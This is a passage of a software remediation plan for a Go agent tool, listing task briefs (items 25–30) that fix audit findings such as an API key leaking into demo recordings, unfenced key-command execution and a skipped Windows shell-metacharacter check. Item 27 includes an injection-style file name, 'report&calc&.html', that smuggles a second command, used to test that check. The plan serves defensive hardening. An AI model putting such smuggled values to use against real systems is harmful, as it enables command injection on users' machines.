**Read first:** cmd/apogee/wire_boot.go — Context-seeding func, line 290 (int conversion needed); cmd/apogee/wire_firing_test.go — lines 220, 239 (int conversion needed); cmd/apogee/wire_server.go — lines 103-123; internal/config/config.go — ServerEntry, ResolveParallelAgents
**Tests:** `go test -race -count=1 -run Fraction ./internal/config/`
**Acceptance:** `go build ./... && go test -race -count=1 ./internal/config/ && go vet ./cmd/apogee/`
**Commit:** `fix(config): server-entry count keys refuse a fractional value`

## 25. Snapshot capture never freezes a stale index entry

**What:** Fixes the audit's High "A failed git add silently freezes a stale index entry into an undo snapshot".
**Goal:** when `git add -A --ignore-errors` reports an error during `Store.Capture`, the captured tree contains no index entry left over from an earlier capture: a path that failed to stage is absent (the ADR 0074 decision-12 residue case), never its old content.
**Approach (assumed at the header base):** In `internal/snapshot/store.go`, on a non-nil `addErr` remove `s.index` and re-run the add once before `write-tree`; the no-error path keeps the persistent index. Update ADR 0074 decision 12 and the `Capture` doc comment. Test on POSIX with a file chmod 000 after a first successful capture (skip on Windows / as root).
**Files:** internal/snapshot/store.go, internal/snapshot/store_test.go, docs/adr/0074-*.md
**Read first:** internal/snapshot/store.go — Store.Capture, s.index; internal/snapshot/store_test.go — mustCapture, requireGit; docs/adr/0074-*.md — decision 12; internal/undo/snapshot.go — Journal.MarkPre
**Tests:** `go test -race -count=1 -run Capture ./internal/snapshot/`
**Acceptance:** `go test -race -count=1 ./internal/snapshot/ && go test -race -count=1 ./internal/undo/`
**Commit:** `fix(snapshot): rebuild the index when a capture's add fails`

## 26. demorig strips the ambient API key from a take

**What:** Fixes the audit's High "A developer's ambient API key is forwarded unfiltered into a recorded demo take".
**Goal:** `ambientApogeeEnv` in `cmd/demorig/record.go` lists every `config.Env*` constant, including `config.EnvAPIKey`; a test fails if a take's environment built by `apogeeEnv` carries `APOGEE_API_KEY` from the parent.
**Approach (assumed at the header base):** Add the constant; add the test to `cmd/demorig/record_test.go`. Leave `cmd/apogee/main_test.go`'s own list alone (deliberate).
**Files:** cmd/demorig/record.go, cmd/demorig/record_test.go
**Read first:** cmd/demorig/record.go — ambientApogeeEnv, apogeeEnv; internal/config/config.go — Env* const block (2566-2573); cmd/apogee/main_test.go — its own separate ambientApogeeEnv (untouched, lines 27-35)
**Tests:** `go test -race -count=1 -run Env ./cmd/demorig/`
**Acceptance:** `go test -race -count=1 ./cmd/demorig/`
**Commit:** `fix(demorig): strip APOGEE_API_KEY from a take's environment`

## 27. present.command via a cmd shim gets the metacharacter check

**What:** Fixes the audit's Medium "A document-opener override path skips the Windows shell-metacharacter check".
**Goal:** on Windows, an override whose resolved program is `cmd.exe` or ends in `.bat`/`.cmd` (case-insensitive) refuses a substituted `{path}` failing `cmdSafe`; any other override still opens `report&calc&.html`.
**Approach (assumed at the header base):** Apply `cmdSafe` in `Opener.argv`'s `CommandOverride` branch (`internal/present/opener.go`) after `resolveProgram`. Narrow `TestOpenerCommandOverrideIsNotNameBounded` to a native program and add the shim cases. Add a 2026-09-26 amendment to ADR 0019; update `docs/manual/configuration.md` present.command text and the opener comments.
**Files:** internal/present/opener.go, internal/present/opener_test.go, docs/adr/0019-*.md, docs/manual/configuration.md
**Read first:** internal/present/opener.go — Opener.argv, resolveProgram, cmdSafe, CommandOverride; internal/present/opener_test.go — TestOpenerCommandOverrideIsNotNameBounded; docs/adr/0019-*.md — Amendment (2026-07-26) clause (c)
**Tests:** `go test -race -count=1 -run Opener ./internal/present/`
**Acceptance:** `go test -race -count=1 ./internal/present/`
**Commit:** `fix(present): a cmd-shim document opener gets the metacharacter check`

## 28. probe model fences api-key-cmd like probe

**What:** Fixes the audit's Medium "`apogee probe model` resolves an api-key-cmd outside the exec-from-writable-path fence".
**Regression guard.** `grep -rn "no workspace\|refuses nothing\|never read roots.workspace" internal/config/keyresolve.go internal/config/keyresolve_test.go cmd/apogee/probemodel_test.go docs/manual/configuration.md` and reword every hit describing `probe model` to "fences api-key-cmd against roots.workspace (cwd), like apogee probe"; add `internal/config/keyresolve_test.go` to Files (its `TestKeyResolverWithNoWorkspaceRootFencesNothing` comment, ~line 384-386, is one such hit). The Goal's doc clause is checked by adding `&& ! grep -q "refuses nothing" docs/manual/configuration.md` to Acceptance.
**Goal:** `apogee probe model` resolves its key with `config.NewKeyResolver(<workspace root>)` as `apogee probe` does; a relative-path `api-key-cmd:` under the workspace is refused; `docs/manual/configuration.md` no longer says probe model refuses nothing.
**Approach (assumed at the header base):** In `cmd/apogee/probemodel.go` pass `roots.workspace`; fix the comment there and in `internal/config/keyresolve.go`. Sweep every comment the reviewer's grep above finds describing `probe model` as fencing nothing, in `internal/config/keyresolve.go`, `internal/config/keyresolve_test.go` (`TestKeyResolverWithNoWorkspaceRootFencesNothing`, ~line 384-386) and `cmd/apogee/probemodel_test.go` (~line 393-395), and reword each to "fences api-key-cmd against roots.workspace (cwd), like apogee probe".
**Files:** cmd/apogee/probemodel.go, cmd/apogee/probemodel_test.go, internal/config/keyresolve.go, internal/config/keyresolve_test.go, docs/manual/configuration.md
**Read first:** cmd/apogee/probemodel.go — probeModelCommand, NewKeyResolver(""); cmd/apogee/probe.go — probeHostCommand; cmd/apogee/wire.go — resolveRoots; internal/config/keyresolve.go — NewKeyResolver, fenceKeyCommand; cmd/apogee/probemodel_test.go — TestProbeModelRejectsTheWorkspaceFlag; internal/config/keyresolve_test.go — TestKeyResolverWithNoWorkspaceRootFencesNothing
**Tests:** `go test -race -count=1 -run ProbeModel ./cmd/apogee/`
**Acceptance:** `go test -race -count=1 -run ProbeModel ./cmd/apogee/ && go test -race -count=1 ./internal/config/ && ! grep -q "refuses nothing" docs/manual/configuration.md`
**Commit:** `fix(probe): probe model fences api-key-cmd against the workspace`

## 29. Child delivery rows match by run id

**What:** Fixes the audit's Medium "Concurrent sibling sub-agents sharing a call id can have the wrong delegation status row updated".
**Goal:** `foldChildDelivery` updates only the `pendingInterjections` row whose stored run id equals the event's `RunID`, falling back to call id only when either id is empty; two siblings sharing a call id each clear their own row.
**Approach (assumed at the header base):** Store `head.spawnRunID` on the `queuedInterjection` row when it is queued; match in `internal/tui/interject.go`.
**Files:** internal/tui/interject.go, internal/tui/interject_test.go
**Read first:** internal/tui/interject.go — foldChildDelivery, queuedInterjection (spawn, run fields), stageChildMessage; internal/domain/events.go — ChildInterjectionEvent; internal/tui/interject_test.go — TestRunViewChildDeliveryClearsTheBand
**Tests:** `go test -race -count=1 -run 'Interject|ChildDelivery' ./internal/tui/`
**Acceptance:** `go test -race -count=1 ./internal/tui/`
**Commit:** `fix(tui): match child-delivery rows by run id`

## 30. Patch refuses an unanchored insertion hunk

**What:** Fixes the audit's Medium "A patch's pure-insertion hunk always lands at file-end".
**Goal:** `applyPatch` refuses a hunk with no context or removal lines, with an error telling the model to include at least one context line, unless the target content is empty or the section is `*** Add File`; the file is left untouched on refusal; the tool description states the rule.
**Approach (assumed at the header base):** In `internal/tools/file_edit.go` `applyPatch`, replace the pure-insertion append branch; update the description strings and the comment citing the oracle.
**Files:** internal/tools/file_edit.go, internal/tools/file_edit_test.go
**Read first:** internal/tools/file_edit.go — applyPatch (pure-insertion branch), parsePatchHunks/patchHunk, patchFile regex; internal/tools/file_edit_test.go — TestEditExistingFile_SingleHunkPatch
**Tests:** `go test -race -count=1 -run 'Patch|FileEdit' ./internal/tools/`
**Acceptance:** `go test -race -count=1 ./internal/tools/`
**Commit:** `fix(tools): refuse a patch hunk with no anchor line`
